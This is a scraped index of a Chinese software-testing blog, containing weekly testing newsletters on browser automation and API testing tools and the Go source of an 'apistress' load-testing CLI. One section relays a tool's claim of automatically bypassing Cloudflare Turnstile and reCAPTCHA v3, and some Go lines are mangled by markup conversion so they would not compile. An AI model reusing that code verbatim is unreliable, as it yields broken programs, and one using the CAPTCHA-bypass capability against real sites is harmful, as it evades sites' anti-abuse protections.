也需要同步更新。\n对于新手来说，找到合适版本的 driver 都是一个非常大的挑战。\n所以后面 selenium 官方出品一个叫做selenium manager的工具来解决 driver 更新的问题。\n因为跟 selenium 的深度整合，所以在使用上，selenium manager 是无感的。\n不过在第一次使用时，有可能需要下载浏览器和驱动，所以环境初始化还是有一点点挑战的。\n至于最近风头正盛的playwright，一般情况下，在第一次初始化时也会下载几个主流的浏览器，如果网络有问题的话，容错率还是不高的，有机会安装失败。\n那有没有一种自动化测试工具是可以不用下载任何的浏览器和驱动，就可以直接使用的呢？\n最近就正好发现了这样一款工具\u0026ndash;pydoll。\nPydoll 通过完全摆脱 webdriver 依赖，正在革新浏览器自动化！它直接通过 DevTools 协议连接浏览器，无需外部组件，提供流畅可靠的自动化体验和原生异步性能。 无论是数据抓取、Web 应用测试，还是重复任务自动化，Pydoll 凭借直观的 API 和强大功能，让一切变得简单易用。\n还是同样的调调，一上来就革 webdirver 的命，与 cypress 和 playwright 异曲同工。\n不过试用了一下之后，发现这个工具还是有可取之处的。\n官方给出的优势如下：\n真正的简洁性：我们不希望您浪费时间配置驱动程序或处理兼容性问题。使用 Pydoll，安装即可开始自动化。 真实的人类交互：我们的算法模拟真实的人类行为模式——从点击间隔到鼠标在屏幕上的移动轨迹。 原生异步性能：基于 asyncio 从零构建，Pydoll 不仅仅是支持异步操作——它就是为异步而设计的。 集成智能：自动绕过 Cloudflare Turnstile 和 reCAPTCHA v3 验证码，无需外部服务或复杂配置。 强大的网络监控：轻松拦截、修改和分析所有网络流量，让您完全掌控请求。 事件驱动架构：实时响应页面事件、网络请求和用户交互。 直观的元素查找：现代化的 find() 和 query() 方法，符合直觉且运行稳定。 健壮的类型安全：完善的类型系统，提供更好的 IDE 支持并预防错误。 总结一下，对于测试同学和爬虫爱好者来说，下面的优点是非常有吸引力的。\n有 chrome 就可以用，只要不是特别老旧的机器和浏览器版本，安装好 pydoll 之后就可以直接写代码了 支持异步操作，也就是说可以并发进行用例执行和数据爬取工作了 支持网络拦截器，也就是说可以用来做 api 测试了 代码示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import asyncio from pydoll.browser.chromium import Chrome async def main(): async with Chrome() as browser: tab = await browser.start() await tab.go_to(\u0026#39;https://github.com/autoscrape-labs/pydoll\u0026#39;) star_button = await tab.find( tag_name=\u0026#39;button\u0026#39;, timeout=5, raise_exc=False ) if not star_button: print(\u0026#34;Ops! The button was not found.\u0026#34;) return await star_button.click() await asyncio.sleep(3) asyncio.run(main()) 可以看到，除了 async 和 await 之外，代码的写法跟 selenium 是极其类似的。\n言论 来自这篇文章\nGood test planning guides test execution in finding the most important bugs as quickly as practically possible by developing a strategy and associated testing scope to identify or mitigate relevant risks.\n良好的测试计划通过制定策略和关联的测试范围来识别或减轻相关风险，从而指导测试执行尽快发现最重要的错误。\n","date":"2025-06-19T10:12:22+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A005-google%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E6%B5%8B%E8%AF%95%E7%9A%84/","title":"测试周刊005: Google是怎么做测试的"},{"content":"项目结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 apistress/ ├── go.mod ├── main.go # 主入口 ├── cmd/ │ └── root.go # CLI 命令定义 └── internal/ ├── types/ │ └── config.go # 数据结构定义 ├── client/ │ └── http.go # HTTP 客户端 ├── utils/ │ └── parser.go # 解析工具函数 ├── stress/ │ └── test.go # 压力测试核心逻辑 └── output/ └── printer.go # 结果输出格式化 包结构说明 main - 程序入口点，调用 cmd 包\ncmd - 命令行接口，使用 cobra 处理 CLI 参数\ninternal/types - 内部类型定义\nRequestConfig - 请求配置 TestResult - 测试结果 JSONOutput - JSON 输出格式 internal/client - HTTP 客户端封装\nMakeRequest - 执行 HTTP 请求 internal/utils - 工具函数\nParseDuration - 解析时间字符串 ParseHeaders - 解析头部参数 internal/stress - 压力测试核心\nRunStressTest - 主要测试逻辑 runWorker - 工作协程 updateResults - 结果更新 internal/output - 输出格式化\nPrintResults - 结果打印 printTextResults - 文本格式 printJSONResults - JSON 格式 使用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 创建项目目录 mkdir apistress \u0026amp;\u0026amp; cd apistress # 初始化 Go 模块 go mod init apistress # 创建对应的目录结构 mkdir -p cmd internal/{types,client,utils,stress,output} # 将对应代码保存到各自文件中 # main.go # cmd/root.go # internal/types/config.go # internal/client/http.go # internal/utils/parser.go # internal/stress/test.go # internal/output/printer.go # 安装依赖 go mod tidy # 运行测试 go run . rest --url https://httpbin.org/get --duration 5s # 编译 go build -o apistress ./apistress rest --url https://httpbin.org/post --method POST --body \u0026#39;{\u0026#34;test\u0026#34;:\u0026#34;data\u0026#34;}\u0026#39; --output json 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 // go.mod module apistress go 1.21 require ( github.com/spf13/cobra v1.8.0 github.com/schollz/progressbar/v3 v3.14.1 ) require ( github.com/inconshreveable/mousetrap v1.1.0 // indirect github.com/mitchellh/colorstring v0.0.0-20190213212951-d06e56a500db // indirect github.com/rivo/uniseg v0.4.4 // indirect github.com/spf13/pflag v1.0.5 // indirect golang.org/x/sys v0.14.0 // indirect golang.org/x/term v0.14.0 // indirect ) // main.go package main import ( \u0026#34;apistress/cmd\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) func main() { if err := cmd.Execute(); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;Error: %v\\n\u0026#34;, err) os.Exit(1) } } // cmd/root.go package cmd import ( \u0026#34;apistress/internal/stress\u0026#34; \u0026#34;apistress/internal/types\u0026#34; \u0026#34;apistress/internal/utils\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;github.com/spf13/cobra\u0026#34; ) var rootCmd = \u0026amp;cobra.Command{ Use: \u0026#34;apistress\u0026#34;, Short: \u0026#34;A CLI tool for stress testing REST APIs\u0026#34;, Long: \u0026#34;A powerful CLI tool for stress testing REST APIs with configurable concurrency, rate limiting, and detailed reporting.\u0026#34;, } var restCmd = \u0026amp;cobra.Command{ Use: \u0026#34;rest\u0026#34;, Short: \u0026#34;Perform REST API stress test\u0026#34;, RunE: runRestStressTest, } var ( url string method string body string headers []string concurrency int duration string rate int output string ) func init() { restCmd.Flags().StringVar(\u0026amp;url, \u0026#34;url\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Target URL (required)\u0026#34;) restCmd.Flags().StringVar(\u0026amp;method, \u0026#34;method\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;HTTP method\u0026#34;) restCmd.Flags().StringVar(\u0026amp;body, \u0026#34;body\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Request body (JSON)\u0026#34;) restCmd.Flags().StringSliceVar(\u0026amp;headers, \u0026#34;header\u0026#34;, []string{}, \u0026#34;Headers in format \u0026#39;Key: Value\u0026#39;\u0026#34;) restCmd.Flags().IntVar(\u0026amp;concurrency, \u0026#34;concurrency\u0026#34;, 10, \u0026#34;Number of concurrent requests\u0026#34;) restCmd.Flags().StringVar(\u0026amp;duration, \u0026#34;duration\u0026#34;, \u0026#34;10s\u0026#34;, \u0026#34;Test duration (e.g., \u0026#39;30s\u0026#39;, \u0026#39;5m\u0026#39;)\u0026#34;) restCmd.Flags().IntVar(\u0026amp;rate, \u0026#34;rate\u0026#34;, 0, \u0026#34;Requests per second limit (0 = unlimited)\u0026#34;) restCmd.Flags().StringVar(\u0026amp;output, \u0026#34;output\u0026#34;, \u0026#34;text\u0026#34;, \u0026#34;Output format (text|json)\u0026#34;) restCmd.MarkFlagRequired(\u0026#34;url\u0026#34;) rootCmd.AddCommand(restCmd) } func Execute() error { return rootCmd.Execute() } func runRestStressTest(cmd \\*cobra.Command, args []string) error { // Parse duration testDuration, err := utils.ParseDuration(duration) if err != nil { return fmt.Errorf(\u0026#34;invalid duration: %w\u0026#34;, err) } // Parse headers headerMap, err := utils.ParseHeaders(headers) if err != nil { return fmt.Errorf(\u0026#34;invalid headers: %w\u0026#34;, err) } config := \u0026amp;types.RequestConfig{ URL: url, Method: strings.ToUpper(method), Body: body, Headers: headerMap, } // Validate output format if output != \u0026#34;text\u0026#34; \u0026amp;\u0026amp; output != \u0026#34;json\u0026#34; { return fmt.Errorf(\u0026#34;invalid output format: %s (must be \u0026#39;text\u0026#39; or \u0026#39;json\u0026#39;)\u0026#34;, output) } return stress.RunStressTest(config, concurrency, testDuration, rate, output) } // internal/types/config.go package types import \u0026#34;time\u0026#34; type RequestConfig struct { URL string Method string Body string Headers map[string]string } type TestResult struct { TotalRequests int64 `json:\u0026#34;total_requests\u0026#34;` SuccessfulReqs int64 `json:\u0026#34;successful_requests\u0026#34;` FailedReqs int64 `json:\u0026#34;failed_requests\u0026#34;` MinLatency time.Duration `json:\u0026#34;min_latency_ns\u0026#34;` MaxLatency time.Duration `json:\u0026#34;max_latency_ns\u0026#34;` TotalLatency time.Duration `json:\u0026#34;total_latency_ns\u0026#34;` StatusCodes map[int]int64 `json:\u0026#34;status_codes\u0026#34;` Errors []string `json:\u0026#34;errors\u0026#34;` TestDuration time.Duration `json:\u0026#34;test_duration_ns\u0026#34;` } type JSONOutput struct { Summary TestSummary `json:\u0026#34;summary\u0026#34;` Latency LatencyStats `json:\u0026#34;latency\u0026#34;` StatusCodes map[int]int64 `json:\u0026#34;status_codes\u0026#34;` Errors []string `json:\u0026#34;errors\u0026#34;` } type TestSummary struct { TotalRequests int64 `json:\u0026#34;total_requests\u0026#34;` SuccessfulReqs int64 `json:\u0026#34;successful_requests\u0026#34;` FailedReqs int64 `json:\u0026#34;failed_requests\u0026#34;` RequestsPerSecond float64 `json:\u0026#34;requests_per_second\u0026#34;` TestDurationSec float64 `json:\u0026#34;test_duration_seconds\u0026#34;` } type LatencyStats struct { MinMs float64 `json:\u0026#34;min_ms\u0026#34;` MaxMs float64 `json:\u0026#34;max_ms\u0026#34;` AvgMs float64 `json:\u0026#34;avg_ms\u0026#34;` } // internal/client/http.go package client import ( \u0026#34;apistress/internal/types\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) func MakeRequest(client *http.Client, config *types.RequestConfig) (time.Duration, int, error) { start := time.Now() var reqBody strings.Reader if config.Body != \u0026#34;\u0026#34; { reqBody = \\*strings.NewReader(config.Body) } req, err := http.NewRequest(config.Method, config.URL, \u0026amp;reqBody) if err != nil { return time.Since(start), 0, err } // Add headers for key, value := range config.Headers { req.Header.Set(key, value) } // Set default content type for POST/PUT with body if config.Body != \u0026#34;\u0026#34; \u0026amp;\u0026amp; req.Header.Get(\u0026#34;Content-Type\u0026#34;) == \u0026#34;\u0026#34; { req.Header.Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) } resp, err := client.Do(req) if err != nil { return time.Since(start), 0, err } defer resp.Body.Close() latency := time.Since(start) return latency, resp.StatusCode, nil } // internal/utils/parser.go package utils import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) func ParseDuration(durationStr string) (time.Duration, error) { return time.ParseDuration(durationStr) } func ParseHeaders(headerStrs []string) (map[string]string, error) { headers := make(map[string]string) for \\_, headerStr := range headerStrs { parts := strings.SplitN(headerStr, \u0026#34;:\u0026#34;, 2) if len(parts) != 2 { return nil, fmt.Errorf(\u0026#34;invalid header format: %s\u0026#34;, headerStr) } key := strings.TrimSpace(parts[0]) value := strings.TrimSpace(parts[1]) headers[key] = value } return headers, nil } // internal/stress/test.go package stress import ( \u0026#34;apistress/internal/client\u0026#34; \u0026#34;apistress/internal/output\u0026#34; \u0026#34;apistress/internal/types\u0026#34; \u0026#34;context\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;sync/atomic\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/schollz/progressbar/v3\u0026#34; ) func RunStressTest(config _types.RequestConfig, workers int, testDuration time.Duration, rateLimit int, outputFormat string) error { // Initialize result tracking result := \u0026amp;types.TestResult{ StatusCodes: make(map[int]int64), Errors: []string{}, MinLatency: time.Hour, // Initialize to large value } var mutex sync.Mutex var wg sync.WaitGroup // Create HTTP client httpClient := \u0026amp;http.Client{ Timeout: 30 _ time.Second, } // Setup context for cancellation ctx, cancel := context.WithTimeout(context.Background(), testDuration) defer cancel() // Rate limiter channel var rateLimiter chan struct{} if rateLimit \u0026gt; 0 { rateLimiter = make(chan struct{}, rateLimit) // Start rate limiter goroutine go func() { ticker := time.NewTicker(time.Second / time.Duration(rateLimit)) defer ticker.Stop() for { select { case \u0026lt;-ctx.Done(): return case \u0026lt;-ticker.C: select { case rateLimiter \u0026lt;- struct{}{}: default: // Channel full, skip this tick } } } }() } // Progress bar bar := progressbar.NewOptions(-1, progressbar.OptionSetDescription(\u0026#34;Running stress test...\u0026#34;), progressbar.OptionSpinnerType(14), ) // Start workers for i := 0; i \u0026lt; workers; i++ { wg.Add(1) go func() { defer wg.Done() runWorker(ctx, httpClient, config, result, \u0026amp;mutex, rateLimiter) }() } // Update progress bar go func() { ticker := time.NewTicker(100 \\* time.Millisecond) defer ticker.Stop() for { select { case \u0026lt;-ctx.Done(): return case \u0026lt;-ticker.C: bar.Add(1) } } }() // Wait for all workers to complete wg.Wait() bar.Finish() result.TestDuration = testDuration return output.PrintResults(result, outputFormat) } func runWorker(ctx context.Context, httpClient *http.Client, config *types.RequestConfig, result *types.TestResult, mutex *sync.Mutex, rateLimiter chan struct{}) { for { select { case \u0026lt;-ctx.Done(): return default: // Rate limiting if rateLimiter != nil { select { case \u0026lt;-rateLimiter: // Got permission to make request case \u0026lt;-ctx.Done(): return } } // Make request latency, statusCode, err := client.MakeRequest(httpClient, config) // Update results mutex.Lock() updateResults(result, latency, statusCode, err) mutex.Unlock() } } } func updateResults(result \\*types.TestResult, latency time.Duration, statusCode int, err error) { atomic.AddInt64(\u0026amp;result.TotalRequests, 1) if err != nil { atomic.AddInt64(\u0026amp;result.FailedReqs, 1) if len(result.Errors) \u0026lt; 10 { // Limit error collection result.Errors = append(result.Errors, err.Error()) } } else { atomic.AddInt64(\u0026amp;result.SuccessfulReqs, 1) result.StatusCodes[statusCode]++ } // Update latency stats result.TotalLatency += latency if latency \u0026lt; result.MinLatency { result.MinLatency = latency } if latency \u0026gt; result.MaxLatency { result.MaxLatency = latency } } // calculateAverageLatency calculates the average latency from total latency and request count func calculateAverageLatency(result \\*types.TestResult) time.Duration { if result.TotalRequests == 0 { return 0 } return result.TotalLatency / time.Duration(result.TotalRequests) } // internal/output/printer.go package output import ( \u0026#34;apistress/internal/types\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func PrintResults(result \\*types.TestResult, outputFormat string) error { switch outputFormat { case \u0026#34;text\u0026#34;: return printTextResults(result) case \u0026#34;json\u0026#34;: return printJSONResults(result) default: return fmt.Errorf(\u0026#34;unsupported output format: %s\u0026#34;, outputFormat) } } func printTextResults(result \\*types.TestResult) error { fmt.Println(\u0026#34;\\n=== Stress Test Results ===\u0026#34;) fmt.Printf(\u0026#34;Total Requests: %d\\n\u0026#34;, result.TotalRequests) fmt.Printf(\u0026#34;Successful: %d\\n\u0026#34;, result.SuccessfulReqs) fmt.Printf(\u0026#34;Failed: %d\\n\u0026#34;, result.FailedReqs) fmt.Printf(\u0026#34;Test Duration: %.2fs\\n\u0026#34;, result.TestDuration.Seconds()) if result.TestDuration.Seconds() \u0026gt; 0 { rps := float64(result.TotalRequests) / result.TestDuration.Seconds() fmt.Printf(\u0026#34;Requests/sec: %.2f\\n\u0026#34;, rps) } if result.TotalRequests \u0026gt; 0 { avgLatency := calculateAverageLatency(result) fmt.Println(\u0026#34;\\nLatency:\u0026#34;) fmt.Printf(\u0026#34; Min: %.2fms\\n\u0026#34;, float64(result.MinLatency.Nanoseconds())/1e6) fmt.Printf(\u0026#34; Max: %.2fms\\n\u0026#34;, float64(result.MaxLatency.Nanoseconds())/1e6) fmt.Printf(\u0026#34; Avg: %.2fms\\n\u0026#34;, float64(avgLatency.Nanoseconds())/1e6) } if len(result.StatusCodes) \u0026gt; 0 { fmt.Println(\u0026#34;\\nStatus Codes:\u0026#34;) for code, count := range result.StatusCodes { fmt.Printf(\u0026#34; %d: %d\\n\u0026#34;, code, count) } } if len(result.Errors) \u0026gt; 0 { fmt.Println(\u0026#34;\\nSample Errors:\u0026#34;) for i, err := range result.Errors { if i \u0026gt;= 5 { break } fmt.Printf(\u0026#34; %d: %s\\n\u0026#34;, i+1, err) } } return nil } func printJSONResults(result \\*types.TestResult) error { avgLatency := calculateAverageLatency(result) avgLatencyMs := float64(avgLatency.Nanoseconds()) / 1e6 var rps float64 if result.TestDuration.Seconds() \u0026gt; 0 { rps = float64(result.TotalRequests) / result.TestDuration.Seconds() } minLatencyMs := float64(result.MinLatency.Nanoseconds()) / 1e6 if result.MinLatency == time.Hour { minLatencyMs = 0 } output := types.JSONOutput{ Summary: types.TestSummary{ TotalRequests: result.TotalRequests, SuccessfulReqs: result.SuccessfulReqs, FailedReqs: result.FailedReqs, RequestsPerSecond: rps, TestDurationSec: result.TestDuration.Seconds(), }, Latency: types.LatencyStats{ MinMs: minLatencyMs, MaxMs: float64(result.MaxLatency.Nanoseconds()) / 1e6, AvgMs: avgLatencyMs, }, StatusCodes: result.StatusCodes, Errors: result.Errors, } jsonBytes, err := json.MarshalIndent(output, \u0026#34;\u0026#34;, \u0026#34; \u0026#34;) if err != nil { return fmt.Errorf(\u0026#34;failed to marshal JSON: %w\u0026#34;, err) } fmt.Println(string(jsonBytes)) return nil } ","date":"2025-08-27T07:52:03+08:00","permalink":"zh.ethanhan.cc/p/golang-%E5%AE%9E%E7%8E%B0%E7%9A%84%E7%AE%80%E5%8D%95%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95cli%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/","title":"Golang 实现的简单性能测试CLI工具源码"},{"content":"马上就到端午假期了。\n今天在电梯听到两位女士的对话，大概的意思是一位认为只有一天的假期有点不太过瘾，而另一位觉得假期归来以后上 4 休 2 已经是非常划算了。\n反正我是同意后者的。\n观点 AI 将使得单元测试和接口测试成为标配 前些天 deepseek 发布了新模型，该模型在代码能力上有了较大的提升。\n有人尝试之后表示模型不仅可以正确实现编码需求，还可以在生成代码的同时给出完整的单元测试用例。\n今后将有越来越多的代码会由 ai 实现，而我们可以非常自信的要求 ai 在给出实现的同时，给出完成的单元测试用例和接口测试用例。\n因此在不久的将来，单元测试用例和接口测试用例将会成为增量代码的标配了吧。\n测试同学可能不需要人人都会写单元测试用例了，但是学会看懂测试用例，并用测试思维来对用例进行评审，反而是更实用的技能了。\n从质量保证到集成保证 https://medium.com/@sean.zhang/lets-rethink-the-role-of-qa-it-s-not-about-owning-quality-ed159d0a424b\n传统的\u0026quot;质量保证\u0026quot;概念存在两个极端问题：\n过度依赖 QA：认为 QA 团队独自负责产品质量，其他团队可以推卸责任 完全取消 QA：认为每个工程师都应该\u0026quot;拥有质量\u0026quot;，但缺乏系统级验证 作者认为传统的\u0026quot;质量保证\u0026quot;（QA）概念存在误导性，因为质量应该是每个团队的共同责任，而不是 QA 部门的专属职责。\n他提出将 QA 重新定义为\u0026quot;集成保证\u0026quot;（Integration Assurance），专注于验证现代软件系统中多个服务和组件之间的协同工作，就像苹果公司需要确保 iPhone 各个供应商的零件能完美集成一样。\n这个角色类似足球比赛中的守门员——不是唯一的防线，但是防止问题到达用户的最后屏障，同时帮助发现系统级的协调问题和集成风险，而 AI 测试工具应该主要由这个集成保证团队来使用，以确保从全局视角进行有效的端到端验证。\n自动化测试 有效的软件测试需要通过测试替身（Test Doubles）来隔离被测系统，从而编写可控、可靠的单元测试 https://medium.com/@raissa.puti/behind-the-green-check-a-guide-to-test-doubles-7199be3b08c2\n作者认为，真正的测试不仅仅是检查功能是否正常运行，而是要通过 Dummy、Stub、Spy、Mock、Fake 等不同类型的测试替身来替代真实的外部依赖（如 API、数据库、时间服务等），这样可以：\n控制测试环境和输入数据， 验证特定的交互行为， 避免依赖不稳定的外部服务 提高测试速度和可靠性。 作者以自己的 React 项目 SiNgawas 为例，展示了如何在前端测试中应用这些概念，同时分享了借助 AI 工具来改进测试设计的经验。文章强调，好的测试应该专注于验证有意义的行为，而不是简单地检查 UI 渲染，通过合理使用测试替身可以让每个测试都有明确的目的和可预测的结果。\nplaywright 断言中的各种坑 https://0xislamtaha.medium.com/part-2-count-me-out-assert-me-wrong-two-sneaky-playwright-pitfalls-5b53639f645f\n.count()、.all()、.isVisible() 和 .isHidden() 都是\u0026quot;急躁\u0026quot;的方法，不会等待 需要显式等待来避免不稳定性 了解哪些断言会重试，哪些不会 使用 toPass() 将非重试断言转换为可重试的 合理设置超时时间（toPass() 默认超时为 0） 比如\n1 2 3 4 5 6 7 8 9 10 11 12 13 // 等待特定数量的元素 await expect(page.locator(\u0026#34;[data-testid=\u0026#39;listItems\u0026#39;]\u0026#34;)).toHaveCount(5); // 或等待至少达到某个数量 await expect(page.locator(\u0026#34;[data-testid=\u0026#39;listItems\u0026#39;]\u0026#34;)).toHaveCount( expect.any(Number) ); await expect(async () =\u0026gt; { expect( await page.locator(\u0026#39;[data-testid=\u0026#34;listItems\u0026#34;]\u0026#39;).count() ).toBeGreaterThan(5); }).toPass({ timeout: 2 * 60 * 1000 }); 实用 PactumJS 进行接口测试 https://noraweisser.com/2025/05/12/what-makes-pactumjs-awesome-a-quick-look-at-its-best-features\npactumjs 的写法有点复古，有点当年流利编程的意思。比如下面的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 describe(\u0026#34;/authenticate\u0026#34;, () =\u0026gt; { it(\u0026#34;POST with existing username and valid password\u0026#34;, async () =\u0026gt; { await spec() .post(\u0026#34;/auth/login\u0026#34;) .inspect() .withHeaders(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) .withJson({ username: process.env.USERNAME, password: process.env.PASSWORD, }) .expectStatus(200) .expectJsonSchema(authenticationSchema); }); it(\u0026#34;POST with existing username and invalid password\u0026#34;, async () =\u0026gt; { await spec() .post(\u0026#34;/auth/login\u0026#34;) .inspect() .withHeaders(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) .withJson({ username: process.env.USERNAME, password: faker.internet.password(), }) .expectStatus(401) .expectJsonMatch(\u0026#34;error\u0026#34;, \u0026#34;Invalid credentials\u0026#34;); }); it(\u0026#34;POST with non-existing username and password\u0026#34;, async () =\u0026gt; { await spec() .post(\u0026#34;/auth/login\u0026#34;) .inspect() .withHeaders(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) .withJson({ username: faker.internet.username(), password: faker.internet.password(), }) .expectStatus(401) .expectJsonMatch(\u0026#34;error\u0026#34;, \u0026#34;Invalid credentials\u0026#34;); }); }); 该框架还支持 json schema 断言和数据模版这些比较现代化的功能。\n总之 PactumJS 是一个设计良好、对开发者友好的 API 测试自动化工具。\n其流畅的语法、强大的数据处理能力以及内置的各种功能（如模式验证和动态存储）消除了开发第三方解决方案的需求，对于 JavaScript/TypeScript 的 API 测试项目来说非常值得考虑。\n工具 Grafana k6 1.0 正式发布 Grafana k6 1.0 的正式发布，这是该开源性能测试工具的首个主要版本。\n主要特点 语义化版本控制：采用 SemVer 标准，重大更改只在主版本中引入 支持保证：每个主要版本至少提供两年的关键修复支持 公共 API 接口：为扩展开发提供稳定的 Go 模块接口 主要新功能 原生 TypeScript 支持\n无需转译，直接支持 TypeScript 提供类型安全和 IDE 自动完成功能 扩展支持\n支持预批准的扩展程序 在 Grafana Cloud k6 中开箱即用 自动处理依赖关系 改进的测试结果\n现代化的测试报告 场景特定和分组特定的指标 分层结果分组和改进的检查结果 其他质量改进\n稳定化的模块（k6/browser、k6/net/grpc、k6/crypto） 增强的 Grafana Cloud 集成 重构的 k6 cloud 命令 社区成就 GitHub 上超过 27,000 星标\n200+ 贡献者\n全球各时区的团队在使用\n1.0 版本标志着 k6 从性能测试工具演进为端到端可靠性测试解决方案的重要里程碑。\n言论 我们正在进入一个世界，在这个世界里，最先进的系统无法提供正确性的证明，只能提供意图的概率。这要求我们彻底重新思考如何定义软件质量、合同保证和法律责任。这对法院和立法机构提出了挑战，要求它们跟上一个已经超越了旨在规范它的框架的技术范式。 在我们承认这些变化——并将其反映在我们的实践、合同和期望中——之前，我们是在沙子上建立信任。这不是创新，这是幻觉。 by Dick Dowdell\n","date":"2025-05-30T09:26:37+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A004-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%92%8C%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E5%B0%86%E6%88%90%E4%B8%BA%E6%A0%87%E9%85%8D/","title":"测试周刊004: 单元测试和接口测试用例将成为标配"},{"content":"五一假期结束了。\n这次五一完美的错峰出行。\n核心的原因是起的早。\n天刚亮就出发，第一波到达景区，人流汹涌的时候就回酒店休息。\n世间的喧闹与我无关。\n这大概是一种错位竞争吧。\n比如，当测试都在千军万马涌入新领域的时候，业务在原有的业务上进行深耕反而会取得一些错位竞争的优势。\n观点 测试将会变得越来越重要 https://filiphric.com/testing-will-become-more-important-not-less\n作者认为在 LLM 时代，测试将会变得举足轻重，并给出了几个预测。\n测试将更紧密嵌入软件创建过程 AI 不仅生成应用代码，还将同时生成测试代码 code review 时也将包括 review 通过的测试 运行先前迭代生成的测试可避免回归问题 更多 AI 解决方案将整合自动化测试 将出现更多能同时生成代码和测试的 AI 工具 已有工具（如 Replay.io 的 Nut.new）能在后台运行测试并将结果反馈给 LLM 人工测试将演变而非消失 人工测试将更加精细，专注于新功能测试和 code review 回归测试将主要由自动化测试承担 测试人员将专注于变更测试，而不是专门写自动化测试用例 良好的测试设计将继续受到高度重视 优秀测试工程师的价值不仅在于编写测试代码 良好的测试实践、测试数据架构和风险区域识别能力更为关键 技术精湛的测试人员将引导和 review AI 生成的测试代码 应用和测试运行时将成为巨大挑战 虽然 Playwright 等工具中的追踪查看功能成为标准，但应用运行时信息仍然缺乏 AI 模型在调试软件方面仍有困难，因为它们缺乏代码实际运行方式的信息 可观察性工具可能是让 AI 生成可靠代码的关键 优秀的测试工程师应该具备哪些思维方式 https://qualityeng.substack.com/p/the-three-mindsets-of-a-qe\n这篇文章探讨了测试工程师(Quality Engineer)应当具备的三种关键思维方式，这些思维方式可以帮助他们从\u0026quot;质量检查员\u0026quot;转变为\u0026quot;质量文化塑造者\u0026quot;：\n好奇心：始终保持学习的态度 内在驱动的信息寻求行为 帮助我们保持开放心态，发现模式、惊喜和可能性 使我们能更好地注意到质量如何在系统中产生或劣化 谦逊：认识到我们并不拥有所有答案 了解自己知道什么，更重要的是不知道什么 承认知识存在差距，并主动寻求信息填补盲点 欢迎反馈、提问并承认不确定性，同时保持自信 同理心：我们需要相互支持 能够分享他人的感受，不加评判地理解他人视角 在团队中创造安全感，让人们可以提出关切、想法、错误和问题 与同情不同，同理心是设身处地感受他人的成功和失败 UI 自动化用例到底要多少才算足够 https://cakehurstryan.com/2025/04/25/you-dont-need-so-many-e2e-tests-or-do-we\n根据测试金字塔的观点，ui 自动化用例的数量应该不需要特别多。\n这是因为 ui 自动化测试\n执行比较慢 调试困难 维护成本高 不过上文提出了一个观点，那就是 ui 自动化用例的多少其实取决于项目的实际情况。\n比如下面的情形里，ui 自动化用例是可以酌情增加的。\n代码不支持小型测试：某些代码结构不易进行单元测试 组织结构限制：开发和测试团队分离 技能限制：团队缺乏编码能力 